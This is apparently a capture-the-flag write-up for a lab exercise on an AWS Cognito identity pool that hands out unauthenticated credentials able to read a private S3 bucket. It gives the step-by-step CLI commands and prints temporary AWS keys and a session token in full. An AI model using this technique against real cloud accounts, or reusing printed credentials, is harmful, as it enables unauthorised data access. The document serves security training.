# Challenge 5

## We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.
- https://bigiamchallenge.com/challenge/5

## IAM Policy
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

## Source
```javascript
 AWS.config.region = 'us-east-1';
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"});
  // Set the region
  AWS.config.update({region: 'us-east-1'});

  $(document).ready(function() {
    var s3 = new AWS.S3();
    params = {
      Bucket: 'wiz-privatefiles',
      Key: 'cognito1.png',
      Expires: 60 * 60
    }

    signedUrl = s3.getSignedUrl('getObject', params, function (err, url) {
      $('#signedImg').attr('src', url);
    });
});
```
## Solution

```bash
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:c00c1061-ebfd-40c4-9075-e22a75b022cf"
}
```

```bash
> aws cognito-identity get-credentials-for-identity  --identity-id us-east-1:2735026b-305b-48f7-b2f0-820cdce9879f
{
    "IdentityId": "us-east-1:2735026b-305b-48f7-b2f0-820cdce9879f",
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXDWCAB3IN",
        "SecretKey": "7QQnYzmQKG7L2hEuHm+akiCBCTsSxizH5gZd6XEo",
        "SessionToken": "IQoJb3JpZ2luX2VjEP///////////wEaCXVzLWVhc3QtMSJHMEUCIQDLZJMmzjRLQ/oK4hAqG5ezPVrr/wLAhVlhVH+uz78oaAIgOTUQW6A2YlyURUw0YyNpyxSbzfTsGWCqUNROEJRRDxoqkAYI
qP//////////ARAAGgwwOTIyOTc4NTEzNzQiDLtYGNOu1hZvO3cRWirkBYmagqPi1/VeOVDSPbMA9O9EiXgUTftyhZ65D/cGH+n1gt65L9WO1SlhHPByDlusY70y00R0VuI+0SkDmJgW0Z1ZtLe3ZaVjiuOsKog+lLl+e/k809A5q
ebBIM36movkj0mjs1ewtg4sAwONgB3RCKqn4+NlpXCQwrGmaSjIvWAYGmCvH8jcOSbP+jBs+x19tI61x9/S8lJulKFKP9+9OxsXFK33SDKGvJWqb7kJNmwj6MC6pfOSvtl16TI7ovOWH6iW3dd0wQ41fzzsglGwIMwR5CHvVhhKjn
0pr2f/IgKYJva444P5p2KfhIewYIu0x4MqRK7f5RHEcLmcrrBOPbXPhazh1A4jQmDVuvri1g3ZkC1MiwiGN94VT/02zO3hJUhWN34Jg5yenmkCFTcn/foQXNresuX775K7VlmyafJvYZzh8sQ4W3pDkYZPabcIP4IAbNXTXYPxuhU
FqWDibDcNUsAeJm4Sq6d1dKITOj825T+EyBv0riW3RNj8VMJOxzsRaZKS8a0XE93eYCwlYskP/Ly4R3wdQNu+HHB1LmZCC7iQ+wgkR13dW4/Umk+fabEn/d+qEGNLaeC0NSYa815tqaU6/0wA38SrHJNCmCBsiMJ7lJ4nAblnKJ4e
pJVegmR+8QlWRnETrXwZVAh+iMlNgzfW4l7llTcsRP3UaYRDgUA7l3/GUwYO0lOJzRiJgyZNFUUJH+bpKCdMh4ELXTZQY2xVTeI/94wmqP6OcwybqI1haLXa93VoZXeXVQTcrwxBIZcobceNG22ngF/pMGnBoSMDIXt4fMqeyu4vl
DWgUud+dzTW3cW6Ngldr8kft1de2dUbwsG351L8rlbPu6Ak3YoauQ08liG8pQ4ycf+uqzmoWIXEsmCB/4KlaCzFlHDaTRv2DLqAiTbAz8ujxpfdx61IK/EZPdkuZAMKX7XN4D1Lt/Gyrp5nzvQpnj4kcaziN1fwFNS5wCL95IVU/Q
DPm/paMPnRzqYGOocCP0FgKPlPkebruYURj0kFZGtZVSawKAUaqDLpZ6XP/kHtE9xIA5++bPk+5a8bpkuNOKfN6pfpSQeTEodzEAC1GFiOuSUG4Y3ndFNPLoVZBfxkMiIhq9s1Q5f851cNKOWVlPh7VU+srJUov3kjIGmVZvEiUYG
aab8PUuV9xY1e7nYlyqz++vdfl7KPIuuCLqCp9vTcNf5VE6WfR3HJ1DWCX3B2ku6hmaFbWWXtf2w6yyy6oDZVmHTnbF+Lm+iHn0kb4DkcwySw4Mi+owuUGdri7lq+25JqeYYgAySPvfHK2XMoC2BWxyx2tye+ZY3ujg81pNGTVbYW
hvpCqXLQL83ibCfzVc6X5Wo=",
        "Expiration": 1691596553.0
    }
}

```
- Import the credentials using aws configure
``` bash
aws sts get-caller-identity --profile bigiamchallenge5 | cat
{
    "UserId": "AROARK7LBOHXJKAIRDRIU:CognitoIdentityCredentials",
    "Account": "092297851374",
    "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessUnauth_Role/CognitoIdentityCredentials"
}

```

```bash
aws s3 ls s3://wiz-privatefiles/ --profile bigiamchallenge5
2023-06-05 21:42:27       4220 cognito1.png
2023-06-05 15:28:35         37 flag1.txt
```
```bash
aws s3 cp s3://wiz-privatefiles/flag1.txt -  --profile bigiamchallenge5
{wiz:incognito-is-always-xxxxx}
```
